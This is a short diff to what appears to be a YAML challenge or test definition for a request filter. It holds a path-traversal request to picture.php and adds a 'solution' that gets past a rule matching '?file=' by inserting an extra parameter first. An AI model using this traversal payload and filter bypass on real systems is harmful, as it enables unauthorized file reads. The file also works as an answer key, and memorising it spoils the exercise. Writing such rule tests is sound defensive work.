@@ -16,6 +16,12 @@ base_request: |-
   GET /picture.php?file=../../../../../../../var/www/html/picture.php HTTP/1.1
   Host: localhost
 
+solution: |-
+  GET /picture.php?a=b&file=../../../../../../../var/www/html/picture.php HTTP/1.1
+  Host: localhost
+
+solution_note: Add an extra argument (?a=b&)
+
 rules:
 # ?file=
   - >
